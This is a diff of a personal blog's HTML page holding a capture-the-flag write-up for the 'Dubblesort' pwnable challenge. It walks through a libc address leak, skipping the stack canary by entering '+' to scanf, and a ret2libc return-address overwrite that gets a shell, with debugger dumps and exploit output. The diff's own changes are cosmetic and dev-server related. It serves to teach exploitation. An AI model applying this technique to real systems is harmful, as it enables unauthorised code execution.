@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 
-<head>
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
   <title>
   Dubblesort · Lucas Ball
 </title>
@@ -18,8 +18,7 @@ Start out by checking the security on the binary:
 pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Yikes. Alright looks like there&rsquo;s gonna be a very specific bug here.">
 <meta name="keywords" content="blog,cybersecurity,infosec,personal,pwn">
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Dubblesort"/>
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Dubblesort"/>
 <meta name="twitter:description" content="Dubblesort Link to heading Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it&rsquo;s solved and here&rsquo;s how it&rsquo;s done.
 Start out by checking the security on the binary:
 pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Yikes. Alright looks like there&rsquo;s gonna be a very specific bug here."/>
@@ -29,14 +28,14 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 Start out by checking the security on the binary:
 pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled Yikes. Alright looks like there&rsquo;s gonna be a very specific bug here." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://lucasball.com/write-ups/pwnable/dubblesort/" /><meta property="article:section" content="write-ups" />
+<meta property="og:url" content="http://localhost:1313/write-ups/pwnable/dubblesort/" /><meta property="article:section" content="write-ups" />
 <meta property="article:published_time" content="2023-01-27T19:46:10-08:00" />
 <meta property="article:modified_time" content="2023-01-27T19:46:10-08:00" />
 
 
 
 
-<link rel="canonical" href="https://lucasball.com/write-ups/pwnable/dubblesort/">
+<link rel="canonical" href="http://localhost:1313/write-ups/pwnable/dubblesort/">
 
 
 <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
@@ -44,7 +43,7 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.65236a6d834b26194eed04a2a3b45e44d9194ef9e620253705d4bef03bd7ef81.css" integrity="sha256-ZSNqbYNLJhlO7QSio7ReRNkZTvnmICU3BdS&#43;8DvX74E=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
 
 
 
@@ -54,7 +53,7 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.f6534b0b446b75d9b6ad77a97d43ede2ddaeff1b6e2361fb7198d6f8fcb7f83f.css" integrity="sha256-9lNLC0Rrddm2rXepfUPt4t2u/xtuI2H7cZjW&#43;Py3&#43;D8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
   
 
 
@@ -145,7 +144,7 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
   <article>
     <header>
       <h1 class="title">
-        <a class="title-link" href="https://lucasball.com/write-ups/pwnable/dubblesort/">
+        <a class="title-link" href="http://localhost:1313/write-ups/pwnable/dubblesort/">
           Dubblesort
         </a>
       </h1>
@@ -160,7 +159,7 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 </h1>
 <p>Okay this was by far the most frustrating challenge yet. So many issues that took way too long to fix. Nevertheless, it&rsquo;s solved and here&rsquo;s how it&rsquo;s done.</p>
 <p>Start out by checking the security on the binary:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwn checksec ./dubblesort
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwn checksec ./dubblesort
 </span></span><span style="display:flex;"><span>    Arch:     i386-32-little
 </span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
 </span></span><span style="display:flex;"><span>    Stack:    Canary found
@@ -168,7 +167,7 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 </span></span><span style="display:flex;"><span>    PIE:      PIE enabled
 </span></span><span style="display:flex;"><span>    FORTIFY:  Enabled
 </span></span></code></pre></div><p>Yikes. Alright looks like there&rsquo;s gonna be a very specific bug here. Lets test out the program to see what happens:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>What your name :a
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>What your name :a
 </span></span><span style="display:flex;"><span>Hello a
 </span></span><span style="display:flex;"><span>��,How many numbers do you what to sort :2
 </span></span><span style="display:flex;"><span>Enter the 0 number : 1
@@ -177,12 +176,12 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 </span></span><span style="display:flex;"><span>Result :
 </span></span><span style="display:flex;"><span>1 2
 </span></span></code></pre></div><p>Hmmm. Looks like there&rsquo;s some weird stuff going on when it asks for your name. After a look in GDB, looks like it&rsquo;s just printing out whatever is on the stack. There&rsquo;s some random values there to look at:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/20x 0xffffda3c &lt;- Location of name on the stack
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/20x 0xffffda3c &lt;- Location of name on the stack
 </span></span><span style="display:flex;"><span>0xffffda3c:     0x000040d7      0xffffdc69      0x0000002f      0x0000009e
 </span></span><span style="display:flex;"><span>0xffffda4c:     0x00000016      0x00008000      0xf7fcf000      0xf7fcd244
 </span></span></code></pre></div><p>Woah that 7th value is interesting&hellip; After a check in vmmap I can see it&rsquo;s the GOT of libc. This means if we leak this, there is a chance of a ret2libc attack. Alright lets try it to see what we get. I need to input 25 &ldquo;A&quot;s and I should be able to leak that value. The reason it has to be 25 and not 24 is because the printf call will stop the print at the null value in the address (e.g <code>0xf7fcf000</code>) the first character <code>\x00</code> will stop the printf before it prints the rest of the address. So we can overwrite that last value and it should print the whole thing like this: <code>0xf7fcf041</code> in this case: <code>0x41</code> is the hex value of &ldquo;A&rdquo; which will be printed to the screen along with the rest of the address. After this leak, we now can calculate the base of libc.</p>
 <p>Okay have a libc leak. How can we utilize this to our advantage. My first though was hey maybe if I buffer overflow the part where it asks me for the number I&rsquo;d like to sort maybe I can overwrite the return address on the stack. Welp:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>What your name :A
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>What your name :A
 </span></span><span style="display:flex;"><span>Hello A
 </span></span><span style="display:flex;"><span>��,How many numbers do you what to sort :1
 </span></span><span style="display:flex;"><span>Enter the 0 number : 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
@@ -190,12 +189,12 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 </span></span><span style="display:flex;"><span>Result :
 </span></span><span style="display:flex;"><span>4294967295
 </span></span></code></pre></div><p>Okay looks like it converts my number directly into a %u unsigned integer</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span> 0x56555a95 &lt;main+210&gt;    call   __isoc99_scanf@plt
-</span></span><span style="display:flex;"><span>        format: 0x56555bfa ◂— 0x45007525 /* &#39;%u&#39; */
-</span></span><span style="display:flex;"><span>        vararg: 0xffffda4c —▸ 0xf7ffc7e0
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span> <span style="color:#fab387">0x56555a95</span> <span style="color:#89dceb;font-weight:bold">&lt;</span>main<span style="color:#89dceb;font-weight:bold">+</span><span style="color:#fab387">210</span><span style="color:#89dceb;font-weight:bold">&gt;</span>    call   __isoc99_scanf<span style="color:#f38ba8">@</span>plt
+</span></span><span style="display:flex;"><span>        format: <span style="color:#fab387">0x56555bfa</span> <span style="color:#f38ba8">◂—</span> <span style="color:#fab387">0x45007525</span> <span style="color:#89dceb;font-weight:bold">/*</span> <span style="color:#a6e3a1">&#39;</span><span style="color:#a6e3a1">%u</span><span style="color:#a6e3a1">&#39;</span> <span style="color:#89dceb;font-weight:bold">*/</span>
+</span></span><span style="display:flex;"><span>        vararg: <span style="color:#fab387">0xffffda4c</span> <span style="color:#f38ba8">—▸</span> <span style="color:#fab387">0xf7ffc7e0</span>
 </span></span></code></pre></div><p>Yep.</p>
 <p>Okay what if we figure out a way to exploit the sorting function. Maybe there&rsquo;s some weird stuff with the sorting function that would cause some funkiness in the program. Lets try it:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>What your name :a
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>What your name :a
 </span></span><span style="display:flex;"><span>Hello a
 </span></span><span style="display:flex;"><span>��,How many numbers do you what to sort :25
 </span></span><span style="display:flex;"><span>Enter the 0 number : 1
@@ -228,7 +227,7 @@ pwn checksec ./dubblesort Arch: i386-32-little RELRO: Full RELRO Stack: Canary f
 </span></span><span style="display:flex;"><span>1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 *** stack smashing detected ***: terminated
 </span></span></code></pre></div><p>OOOH we got a stack smash. HUH??? What&rsquo;s going on. I took a look at our input in GDB to see what I could make of it:
 Before input:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/30x 0xffffda4c
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>pwndbg&gt; x/30x 0xffffda4c
 </span></span><span style="display:flex;"><span>0xffffda4c:     0xf7ffc7e0      0x00000000      0x00000000      0x00005034
 </span></span><span style="display:flex;"><span>0xffffda5c:     0x5998aa00      0x029c6fbf      0x00000534      0x0000009e
 </span></span><span style="display:flex;"><span>0xffffda6c:     0xf7fb0a61      0x00000000      0xf7fba000      0xf7ffc7e0
@@ -237,7 +236,7 @@ Before input:</p>
 </span></span><span style="display:flex;"><span>0xffffda9c:     0x56555b72      0x00000001      0xffffdb64      0xffffdb6c
 </span></span><span style="display:flex;"><span>0xffffdaac:     0x5998aa00 &lt;- Stack Canary
 </span></span></code></pre></div><p>After input:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xffffda4c:     0x00000001      0x00000001      0x00000001      0x00000001
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xffffda4c:     0x00000001      0x00000001      0x00000001      0x00000001
 </span></span><span style="display:flex;"><span>0xffffda5c:     0x00000001      0x00000001      0x00000001      0x00000001
 </span></span><span style="display:flex;"><span>0xffffda6c:     0x00000001      0x00000001      0x00000001      0x00000001
 </span></span><span style="display:flex;"><span>0xffffda7c:     0x00000001      0x00000001      0x00000001      0x00000001
@@ -246,21 +245,21 @@ Before input:</p>
 </span></span><span style="display:flex;"><span>0xffffdaac:     0x00000001 &lt;- Was stack canary
 </span></span></code></pre></div><p>Okay we overwrote the stack canary. That sucks, but that means if we can do that, we can overwrite the return address. The only problem is the stack canary will always be in the way. If only there was a way to skip over the canary&hellip; Well if I try to enter a letter &ldquo;L&rdquo; into the input at any point. It crashes the scanf function and it doesn&rsquo;t read anything else. This was the method I started with, but soon found out a much better solution. If you enter the &ldquo;+&rdquo; symbol instead of the number, it won&rsquo;t crash the scanf function, but it also won&rsquo;t overwrite whatever is in memory at that spot. So If I do this at the stack canary it will prevent it from being overwritten. There&rsquo;s one more obstacle in this: Whatever I enter needs to be in ascending order. This is a sorting function right?</p>
 <p>Alright so looks like I have all the information I need now to complete the exploit. I start out with a leak in libc. Then I enter an ascending stack with a &ldquo;+&rdquo; at the 25th spot and then All the values afterward need to be larger than the stack canary. This would allow me to overwrite the return address and change the control flow of the program. The inputs would look a little like this:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#34;1&#34; * 24
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#34;1&#34; * 24
 </span></span><span style="display:flex;"><span>&#34;+&#34; 
 </span></span><span style="display:flex;"><span>&#34;&lt;addr_system&gt;&#34; * 9 &lt;-- 9th value overwrites return addr
 </span></span><span style="display:flex;"><span>&#34;&lt;addr_binsh&gt;&#34;
 </span></span></code></pre></div><p>Since I have the address of libc, I can calculate all the offsets to get the address of system and the string &ldquo;/bin/sh&rdquo;. When the program returns it will call <code>system(&quot;/bin/sh&quot;)</code> And there&rsquo;s our shell.</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[b&#39;Hello&#39;, b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAPm\xf7D2m\xf7\x01\xf6YV\xa9\xf7YV\xa0\x0fZV\x01&#39;, b&#39;How&#39;, b&#39;many&#39;, b&#39;numbers&#39;, b&#39;do&#39;, b&#39;you&#39;, b&#39;what&#39;, b&#39;to&#39;, b&#39;sort&#39;, b&#39;:&#39;]
-</span></span><span style="display:flex;"><span>./e.py:34: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-</span></span><span style="display:flex;"><span>  p.sendline(str(length))
-</span></span><span style="display:flex;"><span>./e.py:48: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-</span></span><span style="display:flex;"><span>  p.sendline(str(system))
-</span></span><span style="display:flex;"><span>./e.py:52: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-</span></span><span style="display:flex;"><span>  p.sendline(str(binsh))
-</span></span><span style="display:flex;"><span>Processing......
+<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>[<span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;Hello&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAPm</span><span style="color:#89b4fa">\xf7</span><span style="color:#a6e3a1">D2m</span><span style="color:#89b4fa">\xf7\x01\xf6</span><span style="color:#a6e3a1">YV</span><span style="color:#89b4fa">\xa9\xf7</span><span style="color:#a6e3a1">YV</span><span style="color:#89b4fa">\xa0\x0f</span><span style="color:#a6e3a1">ZV</span><span style="color:#89b4fa">\x01</span><span style="color:#a6e3a1">&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;How&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;many&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;numbers&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;do&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;you&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;what&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;to&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;sort&#39;</span>, <span style="color:#f38ba8">b</span><span style="color:#a6e3a1">&#39;:&#39;</span>]
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">./</span>e<span style="color:#89dceb;font-weight:bold">.</span>py:<span style="color:#fab387">34</span>: BytesWarning: Text is <span style="color:#89dceb;font-weight:bold">not</span> bytes; assuming ASCII, no guarantees<span style="color:#89dceb;font-weight:bold">.</span> See https:<span style="color:#89dceb;font-weight:bold">//</span>docs<span style="color:#89dceb;font-weight:bold">.</span>pwntools<span style="color:#89dceb;font-weight:bold">.</span>com<span style="color:#89dceb;font-weight:bold">/</span><span style="color:#6c7086;font-style:italic">#bytes</span>
+</span></span><span style="display:flex;"><span>  p<span style="color:#89dceb;font-weight:bold">.</span>sendline(<span style="color:#89dceb">str</span>(length))
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">./</span>e<span style="color:#89dceb;font-weight:bold">.</span>py:<span style="color:#fab387">48</span>: BytesWarning: Text is <span style="color:#89dceb;font-weight:bold">not</span> bytes; assuming ASCII, no guarantees<span style="color:#89dceb;font-weight:bold">.</span> See https:<span style="color:#89dceb;font-weight:bold">//</span>docs<span style="color:#89dceb;font-weight:bold">.</span>pwntools<span style="color:#89dceb;font-weight:bold">.</span>com<span style="color:#89dceb;font-weight:bold">/</span><span style="color:#6c7086;font-style:italic">#bytes</span>
+</span></span><span style="display:flex;"><span>  p<span style="color:#89dceb;font-weight:bold">.</span>sendline(<span style="color:#89dceb">str</span>(system))
+</span></span><span style="display:flex;"><span><span style="color:#89dceb;font-weight:bold">./</span>e<span style="color:#89dceb;font-weight:bold">.</span>py:<span style="color:#fab387">52</span>: BytesWarning: Text is <span style="color:#89dceb;font-weight:bold">not</span> bytes; assuming ASCII, no guarantees<span style="color:#89dceb;font-weight:bold">.</span> See https:<span style="color:#89dceb;font-weight:bold">//</span>docs<span style="color:#89dceb;font-weight:bold">.</span>pwntools<span style="color:#89dceb;font-weight:bold">.</span>com<span style="color:#89dceb;font-weight:bold">/</span><span style="color:#6c7086;font-style:italic">#bytes</span>
+</span></span><span style="display:flex;"><span>  p<span style="color:#89dceb;font-weight:bold">.</span>sendline(<span style="color:#89dceb">str</span>(binsh))
+</span></span><span style="display:flex;"><span>Processing<span style="color:#89dceb;font-weight:bold">......</span>
 </span></span><span style="display:flex;"><span>Result :
-</span></span><span style="display:flex;"><span>4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 4 2294056704 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4149606720 4150779531 $ ls
+</span></span><span style="display:flex;"><span><span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">4</span> <span style="color:#fab387">2294056704</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4149606720</span> <span style="color:#fab387">4150779531</span> <span style="color:#89dceb;font-weight:bold">$</span> ls
 </span></span><span style="display:flex;"><span>bin
 </span></span><span style="display:flex;"><span>boot
 </span></span><span style="display:flex;"><span>dev
@@ -281,7 +280,7 @@ Before input:</p>
 </span></span><span style="display:flex;"><span>sys
 </span></span><span style="display:flex;"><span>tmp
 </span></span><span style="display:flex;"><span>usr
-</span></span><span style="display:flex;"><span>var
+</span></span><span style="display:flex;"><span><span style="color:#cba6f7">var</span>
 </span></span></code></pre></div><p>For more details on the actual exploit script take a look at <code>e.py</code> in the repo.</p>
 <h3 id="issues">
   Issues
@@ -307,7 +306,7 @@ Before input:</p>
     
       2019 -
     
-    2023
+    2024
      Lucas Ball 
     ·
     
@@ -322,7 +321,7 @@ Before input:</p>
 
   
   
-  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  <script src="/js/coder.js"></script>
   
 
   
